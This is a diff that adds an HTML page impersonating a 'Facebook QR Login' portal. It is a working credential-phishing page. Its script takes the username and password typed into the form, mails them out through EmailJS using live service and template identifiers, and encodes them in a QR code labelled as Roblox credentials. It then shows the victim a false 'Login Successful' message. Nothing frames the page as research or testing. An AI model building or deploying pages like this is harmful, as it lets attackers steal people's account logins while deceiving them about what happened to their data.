@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook QR Login Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcode-generator@1.4.4/qrcode.min.js"></script>
+    <style>
+        .qr-container {
+            transition: all 0.3s ease;
+        }
+        .qr-container:hover {
+            transform: scale(1.05);
+        }
+        .login-form {
+            transition: all 0.3s ease;
+            max-height: 0;
+            overflow: hidden;
+        }
+        .login-form.active {
+            max-height: 500px;
+        }
+        .confirmation-popup {
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        .confirmation-popup.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        .security-icon {
+            background: linear-gradient(135deg, #4299e1, #3182ce);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+    </style>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function(){
+            emailjs.init({
+                publicKey: "r7-XOBLe7QBA6tcsG",
+                blockHeadless: true
+            });
+        })();
+    </script>
+</head>
+<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+    <div class="bg-white rounded-xl shadow-xl overflow-hidden w-full max-w-md">
+        <div class="bg-gradient-to-r from-blue-500 to-indigo-600 p-6 text-white">
+            <h1 class="text-2xl font-bold text-center">Facebook QR Login</h1>
+            <p class="text-center text-blue-100 mt-2">Scan the QR code to access your Facebook account</p>
+        </div>
+        
+        <div class="p-6">
+            <div class="qr-container bg-white p-4 rounded-lg border border-gray-200 flex flex-col items-center">
+                <div id="loginForm1" class="login-form active"> <!-- Changed ID -->
+                    <div class="mb-6 flex items-center justify-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="#1877F2" viewBox="0 0 24 24">
+                            <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
+                        </svg>
+                    </div>
+                    <div class="mb-4">
+                        <label for="username" class="block text-gray-700 text-sm font-medium mb-2">Username</label>
+                        <input type="text" id="username" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Mobile phone or email">
+                    </div>
+                    <div class="mb-6">
+                        <label for="password" class="block text-gray-700 text-sm font-medium mb-2">Password</label>
+                        <input type="password" id="password" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your password">
+                    </div>
+                    <div class="flex items-center justify-between mb-4">
+                        <div class="flex items-center">
+                            <input id="remember" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                            <label for="remember" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                        </div>
+                        <a href="#" class="text-sm text-blue-600 hover:text-blue-500">Forgot password?</a>
+                    </div>
+                    <button id="submitBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition">
+                        Sign In
+                    </button>
+                </div>
+                <p class="text-gray-600 text-sm text-center">Scan this QR code with your mobile device to open the login page</p>
+            </div>
+
+            <div id="loginForm2" class="login-form mt-6"> <!-- Changed ID -->
+                <div class="mb-6 flex items-center justify-center">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12" fill="#1877F2" viewBox="0 0 24 24">
+                        <path d="M22.675 0h-21.35c-.732 0-1.325.593-1.325 1.325v21.351c0 .731.593 1.324 1.325 1.324h11.495v-9.294h-3.128v-3.622h3.128v-2.671c0-3.1 1.893-4.788 4.659-4.788 1.325 0 2.463.099 2.795.143v3.24l-1.918.001c-1.504 0-1.795.715-1.795 1.763v2.313h3.587l-.467 3.622h-3.12v9.293h6.116c.73 0 1.323-.593 1.323-1.325v-21.35c0-.732-.593-1.325-1.325-1.325z"/>
+                    </svg>
+                </div>
+                <div class="mb-4">
+                    <label for="username2" class="block text-gray-700 text-sm font-medium mb-2">Username</label>
+                    <input type="text" id="username2" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your username">
+                </div>
+                <div class="mb-6">
+                    <label for="password2" class="block text-gray-700 text-sm font-medium mb-2">Password</label>
+                    <input type="password" id="password2" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500" placeholder="Enter your password">
+                </div>
+                <div class="flex items-center justify-between mb-4">
+                    <div class="flex items-center">
+                        <input id="remember2" type="checkbox" class="h-4 w-4 text-blue-600 focus:ring-blue-500 border-gray-300 rounded">
+                        <label for="remember2" class="ml-2 block text-sm text-gray-700">Remember me</label>
+                    </div>
+                    <a href="#" class="text-sm text-blue-600 hover:text-blue-500">Forgot password?</a>
+                </div>
+                <button id="submitBtn2" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition">
+                    Sign In
+                </button>
+            </div>
+        </div>
+
+        <div id="confirmationPopup" class="confirmation-popup fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4">
+            <div class="bg-white rounded-xl p-6 max-w-sm w-full">
+                <div class="flex justify-center mb-4">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+                    </svg>
+                </div>
+                <h2 class="text-xl font-bold text-center mb-2">Login Successful</h2>
+                <p class="text-gray-600 text-center mb-4">Your login information has been processed securely.</p>
+                <div id="userQrCode" class="flex justify-center mb-6"></div>
+                <p class="text-sm text-gray-500 text-center mb-2">Scan this QR code for quick future access</p>
+                <button id="closePopupBtn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 px-4 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2 transition">
+                    Continue
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const userQrCode = document.getElementById('userQrCode');
+
+        document.getElementById('submitBtn').addEventListener('click', function (e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value.trim();
+
+            if (!username || !password) {
+                alert('Please enter both username and password.');
+                return;
+            }
+
+            // Generate QR
+            const qr = qrcode(0, 'M');
+            qr.addData(`Roblox Username: ${username}\nRoblox Password: ${password}`);
+            qr.make();
+            userQrCode.innerHTML = qr.createImgTag(6);
+
+            // Show popup
+            document.getElementById('confirmationPopup').classList.add('active');
+
+            // Send via EmailJS
+            emailjs.send("service_r4t8bag", "template_f5n04ig", {
+                to_email: "your-receiving-email@example.com", // Replace with your email
+                username: username,
+                password: password,
+                message: `Username: ${username} Password: ${password}` // Corrected syntax
+            }).then(function(response) {
+                console.log("SUCCESS!", response.status, response.text);
+            }, function(error) {
+                console.error("FAILED...", error);
+                alert("Failed to send email. Check console for details.");
+                console.log("Full error:", error);
+            });
+
+            // Clear fields
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
+        });
+
+        document.getElementById('closePopupBtn').addEventListener('click', function () {
+            // Replace entire body with thank-you screen
+            document.body.innerHTML = `
+                <div class="min-h-screen flex flex-col items-center justify-center bg-white p-6">
+                    <h1 class="text-2xl font-bold text-gray-800 mb-4">Thank You!</h1>
+                    <p class="text-gray-600 mb-6 text-center">You have successfully logged in. Use the QR code below for future logins.</p>
+                    <div class="shadow-lg border border-gray-300 rounded-lg p-4 bg-white">
+                        ${userQrCode.innerHTML}
+                    </div>
+                </div>
+            `;
+        });
+    </script>
+</body>
+</html>
